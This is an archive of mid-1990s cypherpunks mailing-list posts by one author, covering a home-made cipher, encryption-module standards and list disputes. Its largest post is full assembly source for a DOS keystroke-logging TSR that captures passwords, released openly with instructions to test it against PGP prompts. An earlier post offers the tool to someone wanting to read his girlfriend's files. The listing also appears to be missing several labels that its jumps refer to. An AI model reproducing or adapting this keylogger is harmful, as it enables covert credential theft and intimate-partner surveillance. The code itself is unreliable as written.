
@_date: 1994-11-17 13:28:18
@_author: m00012 at KANGA.STCLOUD.MSUS.EDU 
@_subject: Coding and Cypherpunks -- (was Re: Islands in the Net) 
I don't know if it got through, but I made an simple modificartion to
blowfish to turn it into a 128 bit block cipher.
But nobody seems to want it.
Oh well.

@_date: 1994-11-19 22:29:15
@_author: m00012 at KANGA.STCLOUD.MSUS.EDU 
@_subject: Dogwash (sorry if this isn't the proper procedure... 
for posting anouncements...but...
                         ********************************
                         *Post-Preliminary Announcement:*
                         ********************************
 Inspiration:  Dogwash was inspired by (some might say stolen from)                Bruce Schneier's Blowfish.
     DogWash:  A 128 bit block encryption algorithm/fiestal cipher,
               product encryption algorithm....
      Rounds:  The number of rounds can be defined at runtime.                 The range for the number of rounds is from 0 to 6140.                 The speed of the algorithm is correlated to the number                of rounds used, with 16 rounds being reasonably fast.
   Keylength:  The maximum keylength is determined by the number                of rounds.  For rounds=0, the maximum keylength
               is 16 bytes, or 128 bits.  For rounds=6140, the
               maximum keylength is a ridiculous 49136 bytes,                or 393088 bits long.  For a standard 16 rounds,
               the maximum keylength is 144 bytes, or 1152 bits.
  Subkeydata:  64k bytes of high entropy (7.95 bits/char) subkey
               data are included in a header file.  The subkey
               data is mutated with the key, and the result is
               used for encryption/decryption.  Note that the                actual amount of subkey data used is a function                of the number of rounds requested.
               The subkey data is not fixed and may be changed
               so long as your correspondent is using the same
               subkey data.  (Note:  subkey data is later
               mutated with the session key.  I only point out
               that the subkey data may be changed for those
               who might want to do that, for whatever reason.)
  Sourcecode:  The program is written in c++.  Currently, it
               requires a compilier that allows a 64 bit unsigned
               integer addition, %(1<<63).  The use of destructors                helps ensure that mutated subkey data is automatically                destroyed after an encryption or decryption session.                 However, other risks exist, such as memory being                swapped to disk, or the final programmer forgetting
               to protect his/her key.  It should be very easy to
               convert it to standard C.
 Description:  A PostScript file containing block diagrams and
               a well written (well, probably better than this)
               description may become available within the next                few months.
    Security:  I believe that DogWash is practically uncrackable,
               but I haven't the credentials to make such a                pronouncement.  (The only code I have cracked is
               the Sunday paper's Cryptogram.)  But, unlike blowfish,
               this is not a fast encryption algorithm.

@_date: 1995-02-12 23:17:00
@_author: M00012 at kanga.stcloud.msus.edu 
@_subject: standards... 
Secure encryption programs should be / have (imo):
1.  Dynamic, allowing the user to select types of encryption
    on a per session basis, and to allow them to add crypto
    modules as they are developed in the future.
2.  Easy to use.
3.  All source code availible--allowing users to fully
    compile (and examine) the source code.
Such programs should make use of encryption modules or
libraries, and should be able to easily adapt to new
modules as they become available.
An encryption module standard will help facilitate the
creation of the type of programs decsribed above.
Some feateres...
  I.  Public key encryption.
      A.  Uses slower public key encryption to encrypt one or
          more session keys for one or more block ciphers.
      B.  Be used alone on larger blocks of data.  (The future
          may hold public key encryption algorithms that
          make this practical.)
      C.  Not limited to one public encryption scheme.
      C.  Function/format standards that allow user
          interfaces to implement various public key
          crypto functions.
 II.  Block Ciphers
      A.  Each block cipher has a committee assigned
          identification number.
      B.  Uses of random session key for encrypton for
          non-public key encryption.
          1.)  Random session key is encrypted with
               hash of user supplied password.
          2.)  Encrypted session key is appended to
               ciphertext.
      C.  Functrion/format standards for easier chaining
          of multiple block ciphers in user interfaces
          that implement these functions.
          1.)  Minimize/mitigate/eliminate use of layer
               headers that would serve as known plaintext.
III.  Compression
      A.  Perhaps implemented in the same or similar format
          used for block ciphers.
      B.  Compression with a session key/random buffer
          source?  (Used to alter any tables and/or
          mitigate known plaintext attacks, e.g., if
          5 bits of a header are unused...fill these
          with unpredictible bits to be masked off
          latter during decompression.)
      C.  Function/format standards, even though this will
          be, if a compression function is selected, the
          first function called)
          1.)  Minimize/mitigate/eliminate use of layer
               headers that would serve as known plaintext.
 IV.  Hash functions...
  V.  Validation (password and sig.s)
 VI.  Unpredictible (true random) number generation/distribution.
VII.  Variable key lengths.
Of course, this requires _STANDARDS_.  The cypherpunks are
the ideal people to define these standards (and start writing
such modules).  If others are working on this, I'd like to get
a copy of the standards so that I can contribute some code,
otherwise I am willing to help draft the standards--although
the significance of my contributions might amount to an
occasional unoriginal idea.
Some of the qualities listed above, it seems to me, might call
for the use of C++, although C is preferable.

@_date: 1995-02-12 23:41:00
@_author: M00012 at kanga.stcloud.msus.edu 
@_subject: Our Ignorance.... 
Even so, my guess is that 1/4 to 1/3 of the subscribers to this list
are interested government employees--though the most interested are
not using addresses with .gov or .mil.

@_date: 1995-02-13 22:45:28
@_author: M00012 at kanga.stcloud.msus.edu 
@_subject: Cypher_punks standards, again. 
Q.  What do I mean, standards?
A.  A set of specifications that will allow encryption modules
    to be incorperated into receptacle encryption interface
    programs easily.
    The advantages of programs that comply with the CP standard
    might be illustrated with an example.
    Suppose Alice wants to use an interface program, say,
    GENPGP.EXE, to encrypt a message to Bob.
    Suppose that GENPGP is an interface encryption receptacle
    program that allows users to add and use their own encryption
    modules of choice.  If Alice were a command line freak, she
    could type:
        GENPGP -RSA_encrypt_the_session_key \
        -random_session_key_source ISA_Johnson_Noise_ADC \
        -chainsession \
        -blowfish -rounds 18 -keylength 2048 \
        -idea \
        -3descfb \
        -compress pkzip \
        -plain_text_file topsec.doc
        -receipient bob
    Or, suppose Alice is a GUI freak.  In this case she could
    use her entcrypt_lab schematic interface to design and save
    her encryption scheme for topsec.doc, and simply drop the
    icon for the doc into her block diagram's input icon.
    Bob, in either case, is still able to use his own program
    of choise, GNU_safe_mail, to automatically decrypt Alice's
    message to him, so long as Bob has incorperated all of the
    latest modules availible.
Q.  What are some advantages?
A.  There are numerous advantages.  Some programmers are good at
    writing user interfaces, and others are better at implementing
    algorithms.  Currently, many programmers of the second type
    make all sorts of encryption algorithms available, but these
    are not always easily understood by programmers of the first
    type, and more importantly, coded algorithms are not easily
    incorperated into existing programs.
    Another problem that may arise is that existing programs,
    and programs that may come out in the next year or two,
    may gain widespread use (e.g. PGP.EXE), but may at some
    time in the future become practically worthless, for
    example, if widely used interface programs rely on
    encryption algorithms that are discovered or perceived
    to be weak.
    If a standard such as the one I am proposing is released
    and gains acceptance, more programmers will comply, and
    this will allow the users of their interfaces to painlessly
    adapt the interface programs.  More importantly, such
    interface programs that make use of CP complient
    encryption modules will allow users to encrypt as
    insecurely or securely as their parinoia dictates.
    Also, as new encryption algorithms are invented and coded,
    hackers who like to optimize may take the extra step and
    make their code CP complient.  And command line Alice will
    be able to type:
        GENPGP -add_module BlowFish.mod
Q.  What are the disadvantages?
A.  At first blush, one disadvantage is options, like PGP's -m,
   (for your eyes only) are not practical for a standard such
   as the one I am proposing.  But then again, even using the
   command:
        PGP -em susan.doc
    is little more than a suggestion to the recepient of
    the letter to not keep the plaintext around.
Q.  Why should we?
A.  If we don't, IEEE or some other organization is
    bound to, and IEEE seems to be getting more politically
    correct as the years pass, and this doesn't seem to
    be compatible with the purpose of an encryption module
    standard.
    Consequently, I believe that such a task should be initiated
    and taken to completion by a renegade group such as the
    cypherpunks, by committe if possible, with the hopes that
    government moles will not weaken our effort.
Mike Morgan

@_date: 1995-01-05 22:58:49
@_author: m00012 at KANGA.STCLOUD.MSUS.EDU 
@_subject: sniff passwords on PC (DOS) 
As a demonstration of concept, I wrote a small, simple program that
replaces the keyboard interrupt and stores all keystrokes in a buffer.
It was very very easy to write.
It works while using pgp and windows\net.
It does not work after starting windows.  Not sure, but it seems obvious
that MS windows installs it's own keyboard interrupt.
I suppose it would be easy to enhance this simple program (I bet it's been
done by others) to store passwords into a secret file on a hard drive
unbeknownest to the user.
I first suspected that such a program already existed after hearing, two
days after his arrest, that the CIA had cracked Aldrich Aim's encrypted
files.   (sorry if I spelled his name incorrectly.)
Think about it, the govt. could spend 50,000 to 100,000 to create a freeware gif viewer, for example, that installed such a tsr.
P.S.  If the guy who wanted to see his gf's files writes me, I'll send you
this keyboard sniffer program.

@_date: 1995-01-07 19:30:25
@_author: m00012 at KANGA.STCLOUD.MSUS.EDU 
@_subject: carrol( 
What is wrong with this person?
ban her if you can, that's my opnion.

@_date: 1995-01-07 21:17:19
@_author: m00012 at KANGA.STCLOUD.MSUS.EDU 
@_subject: carrol( 
I would put her in my killfile, but I don't know if vms has a kill
file capibility.  I use my unix accounts for important email, and
do not want to have to sift through the volume I get from the cypherpunks.
Otherwise, given that the percentage of interesting posts is going down
as a result of carrolann (and perhaps me too now), I think having an
elite group capable of banning certain people is perfectly ethical.

@_date: 1995-01-11 23:02:56
@_author: m00012 at KANGA.STCLOUD.MSUS.EDU 
@_subject: keyboard sniffer TSR source code... 
For Dos operating systems.
I wrote this in a weekend, and no longer wish to work with it.  I will release it as is....do not ask for support, and if you know where I work, they have no idea I am doing this, so don't make
any assumptions about my company's software.
But, here it is, the source code for a keyboard sniffer program.
After you assemble it, link it, turn it into a .com file, and execute it, just hit  page up for a display of the first
half of the buffer, and  page down for a display of the
second half of the buffer.
Then, test it out with pgp or other dos based programs that ask
you for a password (use a fake one), and you will probably see
how insecure most of these programs are.
-----cut here----
; Keyboard sniffer TSR
; asm kbs.asm
; link kbs.obj
; exe2bin kbs kbs.exe
;Notes:  This is a keyboard sniffer program.  It is intended to
;        show how easy it is to make your computer insecure.
; This program hooks itself to the keyboard interrupt routine.
; It is not difficult to imagine a routine that simply replaced
; the keyboard interrupt routine, or simply monitored the
; keyboard buffer and pointers from another interrupt routine,
; e.g., the timer interrupt.
; It is also not a stretch of the imagination to say that it is
; possible that a program that monitors the keyboard buffer and
; display area for things that look like passwords (e.g., look
; for certain prompts, store next 500 characters) to either an
; unused area of the disk, or a hidden file, already exists.
;  That is to say, the FBI, for example, could have already
; hired some programmers to come up with a .gif viewer that
; also attaches a keyboard sniffer to your system snooping
; for passwords, in the hopes that if and when the find a
; suspected (fill-in-the-blank) "crimminal", all they have
; to do is find the secret file created with their trojan TSR.
KB_INT_NUM        EQU     9     ;keyboard interrupt
BUFFER_SIZE       EQU     0b94H  ;our buffer size, 19 lines 2 buffers
TLC             EQU     0C9H    ;top left corner
HL              EQU     0CDH    ;horizontal line
TRC             EQU     0BBH    ;top right corner
VL              EQU     0BAH    ;vertical line
BLC             EQU     0C8H    ;bottom left corner
BRC             EQU     0BCH    ;bottom right corner
LCT             EQU     0CCH    ;left center tap
RCT             EQU     0B9H    ;right center tap
ALTPGUP         EQU     9900H
ALTPGDN         EQU     0A100H
ROM_BIOS_DATA   SEGMENT AT 40H                  ;bios statuses and kb buffer
        ORG             1AH                     ;absolute
        KB_HEAD         DW      ?               ;head of kb buffer
        KB_TAIL         DW      ?               ;tail of kb buffer
        KB_BUFFER       DW      16 DUP (?)      ;The keyboard buffer
        KB_BUFFER_END   LABEL   WORD
ROM_BIOS_DATA   ENDS
CODE_SEG        SEGMENT
        ASSUME  CS:CODE_SEG
        ORG     100H                          ; .com file
FIRST:  JMP     INSTALL_INTERRUPTS_MAIN
; data area...
        buffer  db      BUFFER_SIZE dup ('*')
        head    dw      5
        tail    dw      5
        cnt     dw      ?
        ind     dw      ?
        show_buff       dw      0
        lkb_tail        dw      0       ;last key board til
                                        ;this is for programs that leave
                                        ;the character in bios buffer
                                        ;past one interrupt, e.g., pgp
        OLD_KB_INTERRUPT   LABEL   WORD
        OLD_KB_INTERRUPT_ADDR      DD      ?
        row     db      ?
        idstring        db      "0x5fcf9eb78a01ef28"   ;18 long
KBINTERRUPT    PROC    NEAR
        ASSUME  CS:CODE_SEG
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    DI
        PUSH    SI
        PUSH    DS
        PUSH    ES
        PUSHF
        CALL    OLD_KB_INTERRUPT_ADDR
        CLI
ASSUME  DS:ROM_BIOS_DATA
        MOV     BX,ROM_BIOS_DATA
        MOV     DS,BX           ; point ds to ROM_BIOS_AREA...
        MOV     BX,KB_TAIL
        CMP     BX,KB_HEAD
        JE      nogo1           ;origianal keyboard interrupt has deleted char
        jmp     short go1
        mov     cx,bx
nogo1:  jmp     kbexit2    ;too far for je...
go1:    ;check to see if we already processed this character
        mov     cx,bx
ASSUME DS:CODE_SEG
        mov     bx,cs
        mov     ds,bx
        cmp     cx,lkb_tail ;is it the same as last time?
        jne     go3  ;no
ASSUME  DS:ROM_BIOS_DATA
        MOV     BX,ROM_BIOS_DATA
        mov     ds,bx
        jmp     kbexit2
        mov     lkb_tail,cx     ;save new tail
ASSUME  DS:ROM_BIOS_DATA
        MOV     BX,ROM_BIOS_DATA
        mov     ds,bx
        mov     bx,cx
        SUB     BX,2
        CMP     BX,OFFSET KB_BUFFER     ;did we wrap around?
        JAE     NO_WRAP                 ;no
        MOV     BX,OFFSET KB_BUFFER_END ;yes
        SUB     BX,2
NO_WRAP:MOV     DX,[BX] ;        char in DX now...
        CMP     DX,ALTPGUP      ;altpgup hit?
        jne     checknext1      ;no
        jmp     short   go2     ;yes, display first half of buffer
checknext1: CMP DX,ALTPGDN      ;altpgdn hit?
        jne     nogo2           ;no
        mov     kb_tail,bx      ;delete alt pgdn from kb_buffer
assume ds:code_seg
        mov     cx,bx
        mov     bx,cs
        mov     ds,bx
        xor     bx,bx           ;garbage last tail
        mov     lkb_tail,bx
        mov     bx,offset buffer;yes, display second half of buffer
        add     bx,BUFFER_SIZE/2
        mov     show_buff,bx
        call    dump_buffer     ;dump second half
        jmp     kbexit1
nogo2:  jmp     save_key        ;too far for jne..
assume ds:rom_bios_data
        mov     cx,bx
        mov     bx,rom_bios_data
        mov     ds,bx
        mov     bx,cx
        mov     kb_tail,bx      ;delete ' pgup' from kb_buffer
assume ds:code_seg
        mov     cx,bx
        mov     bx,cs
        mov     ds,bx
        xor     bx,bx           ;garbage last tail
        mov     lkb_tail,bx
        mov     bx,offset buffer        ;first half buffer
        mov     show_buff,bx
        call    dump_buffer     ;dump first half
        jmp     kbexit1
ASSUME  DS:CODE_SEG
        MOV     BX,CS
        MOV     DS,BX
        mov     bx,offset buffer
        add     bx,head
        mov     [bx],dl ;dh?
        inc     bx
        mov     cx,offset buffer
        add     cx,BUFFER_SIZE
        cmp     bx,cx           ; at end of buffer?
        jz      wrap_it         ; yes
        sub     bx,offset buffer
        mov     head,bx
        jmp     kbexit1
wrap_it:        xor bx,bx
        mov     head,bx
        jmp     kbexit1
ASSUME  DS:ROM_BIOS_DATA
        MOV     BX,ROM_BIOS_DATA
        MOV     DS,BX
kbexit2:        POP     ES
        POP     DS
        POP     SI
        POP     DI
        POP     DX
        POP     CX
        POP     BX
        POP     AX
        STI
        IRET
KBINTERRUPT    ENDP
dump_buffer     PROC    NEAR
ASSUME  DS:CODE_SEG
        MOV     BX,CS
        MOV     DS,BX
        STI
        jmp     over_data
        sl1     db      "                           Keyboard Sniffer Program                           ",0
        sl2     db      " Short Circuit, Inc.                  Version:  0.72 (Beta), (C)opyright 1995 ",0
over_data:      mov     dh,0    ;row
        mov     dl,0    ;column
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     bh,0    ;page
        mov     cx,1    ;count?
        mov     al,TLC  ;top left corner
        mov     ah,0ah  ;service
        int     10h
        mov     dh,0    ;row
        mov     dl,4fh  ;column = 79 dec
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     bh,0    ;page
        mov     cx,1    ;count?
        mov     al,TRC  ;top right corner
        mov     ah,0ah  ;service
        int     10h
        mov     dh,17h  ;row
        mov     dl,0    ;column
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     bh,0    ;page
        mov     cx,1    ;count?
        mov     al,BLC  ;bottom left corner
        mov     ah,0ah  ;service
        int     10h
        mov     dh,17h  ;row
        mov     dl,4fh  ;column=79 dec
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     bh,0    ;page
        mov     cx,1    ;count?
        mov     al,BRC  ;bottom right corner
        mov     ah,0ah  ;service
        int     10h
        mov     cx,4eh  ;78 dec
        mov     dh,0    ;row
        mov     dl,1    ;column
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     bh,0    ;page
        mov     cx,4eh  ; 78 characters
        mov     al,HL   ;horizontal line
        mov     ah,0ah  ;service
        int     10h     ;put char
        mov     dh,3    ;row
        mov     dl,1    ;column
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     bh,0    ;page
        mov     cx,4eh  ; 78 characters
        mov     al,HL   ;horizontal line
        mov     ah,0ah  ;service
        int     10h     ;put char
        mov     dh,17h  ;row
        mov     dl,1
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     bh,0    ;page
        mov     cx,4eh  ;count
        mov     al,HL   ;horizontal line
        mov     ah,0ah  ;service
        int     10h     ;put char
        mov     cx,16h  ;22 lines
dline:  mov     dh,cl   ;row
        mov     dl,0    ;column
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     dx,cx   ;save cx
        mov     bh,0    ;page
        mov     cx,1    ;count
        mov     al,VL   ;vertical line
        mov     ah,0ah  ;service
        int     10h
        mov     cx,dx   ;restore cx
        mov     dh,cl   ;row
        mov     dl,4fh  ;column
        mov     bh,0    ;page
        mov     ah,2    ;service
        int     10h     ;set cursor position
        mov     dx,cx   ;save cx
        mov     bh,0    ;page
        mov     cx,1    ;count
        mov     al,VL   ;vertical line
        mov     ah,0ah  ;service
        int     10h
        mov     cx,dx   ;restore cx
        loop    dline
        mov     dh, 3h  ;row
        mov     dl, 0
        mov     bh, 0   ;page
        mov     ah, 2   ;service
        int     10h     ;set cursor position
        mov     bh, 0   ;page
        mov     cx, 1   ;count
        mov     al,LCT  ;horizontal line
        mov     ah,0ah  ;service
        int     10h     ;put char
        mov     dh, 3h  ;row
        mov     dl, 4fh ;column
        mov     bh, 0   ;page
        mov     ah, 2   ;service
        int     10h     ;set cursor position
        mov     bh, 0   ;page
        mov     cx, 1   ;count
        mov     al,RCT  ;horizontal line
        mov     ah,0ah  ;service
        int     10h     ;put char
        mov     cx, BUFFER_SIZE/2 -1 ;going backwards...
        mov     ind, cx
        mov     cl, 13h
dorows: mov     row, cl
        mov     cx, 4eh
ll0:    mov     cnt, cx
        mov     dl, cl  ;to end of line
        ;inc     dl     ;cnt was 1 too small
        mov     dh,row
        inc     dh
        inc     dh
        inc     dh
        mov     ah,2            ;set cursor position
        mov     bh,0            ;page 0
        int     10h             ;move to 0,0
        mov     bx,show_buff    ;show_buff points to correct half...
        add     bx,ind          ;ind must have index, *(show_buff + ind)
        mov     al,[bx]
        mov     bh,0
        mov     cx,1
        mov     ah,0ah
        int     10h
        dec     ind             ;decrement index
        mov     cx,cnt
        loop ll0
        mov     cl,row
        dec     cl
        jnz     dorows
        mov     dh,1
        mov     dl,1
        mov     bx,offset sl1
        call    print_string
        mov     dh,2
        mov     dl,1
        mov     bx,offset sl2
        call    print_string
        mov     dh,18h
        mov     dl,4
        mov     bh,0
        mov     ah,2
        int     10h     ;move back to correct position
        ret
dump_buffer     ENDP
print_string    PROC    NEAR
        ;assumes ds==cs
        ;null terminated string, address in bx...
        ;row in dh
        ;col in dl
        ;uses bios int 10h, safe for tsr programs...
        jmp     over_local_ps
        sadd    dw      ?
        mov     sadd,bx
np:     mov     bh,0
        mov     ah,2
        int     10h
        mov     bx,sadd
        mov     al,[bx]
        cmp     al,0    ;is it 0?
        je      pse     ;yes, return
        inc     bx
        mov     sadd,bx
        inc     dl
        mov     bh,0
        mov     cx,1
        mov     ah,0ah
        int     10h
        jmp     np      ;next print (next character)
pse:    ret             ;done, encountered 0
print_string    ENDP
; Anything before this point stays in memory if it's okay to install...
; tests to see if kbs is already installed, returns
; zf=1 if it was already installed.
; zf=0 if it has not been previously installed.
kbia      PROC    NEAR
        mov     si,offset idstring      ;ds:si points to our string
        mov     di,bx
        sub     di, 12h                 ;es:di points to other string?
        mov     cx,12h
        REPE    cmpsb
        ret
kbia endp
INSTALL_INTERRUPTS_MAIN       PROC    NEAR
ASSUME  DS:CODE_SEG
                mov     bx,cs
                mov     ds,bx
                xor     bx,bx
                mov     head,bx
                mov     tail,bx
                jmp     over_temp_data
                instg           db      "Kbs installed.",0dh,0ah,"$"
                notinstg        db      "Kbs already installed.",0dh,0ah,"$"
over_temp_data: call    kbia
                je      dont_install_it
                jmp     install_it
                mov     dx,offset notinstg
                mov     ah,09h
                int     21h
                mov     bx,cs
                mov     es,bx
                int     20h
install_it:     MOV     AH, 35H                 ;put old vector into es:bx
                MOV     AL,KB_INT_NUM
                INT     21H
                MOV     OLD_KB_INTERRUPT,BX
                MOV     OLD_KB_INTERRUPT[2],ES
                MOV     AH,25H                  ;set new keyboard interrupt
                LEA     DX,KBINTERRUPT
                INT     21H
                mov     dx,offset instg
                mov     ah,09h
                int     21h
ASSUME  DS:ROM_BIOS_DATA
        MOV     BX,ROM_BIOS_DATA
        MOV     DS,BX
        mov     cx,KB_TAIL
ASSUME  DS:CODE_SEG
        MOV     BX,CS
        MOV     DS,BX
        mov     lkb_tail,cx
        MOV     DX, offset kbia         ;ds:dx end of stay resident
        INT     27H                     ;allocate and stay resident
INSTALL_INTERRUPTS_MAIN       ENDP
CODE_SEG        ENDS
        END     FIRST
; P.S.  I haven't programmed in asm in a long time, no fair flaming
;me for poor programming style/ineffecient code.
; Use this code at your own rish.

@_date: 1995-01-12 19:21:32
@_author: m00012 at KANGA.STCLOUD.MSUS.EDU 
@_subject: Keyboard sniffer source code 
Not to be paranoid, but did anybody receive that program?
Does cypherpunkcs at toad.com have a pgp key?
I think it was intercepted.

@_date: 1995-01-26 08:54:40
@_author: M00012 at kanga.stcloud.msus.edu 
@_subject: Identity 
Gannett sucks.
Kare 11 sucks.
USA Today sucks.
St. Cloud Times sucks.
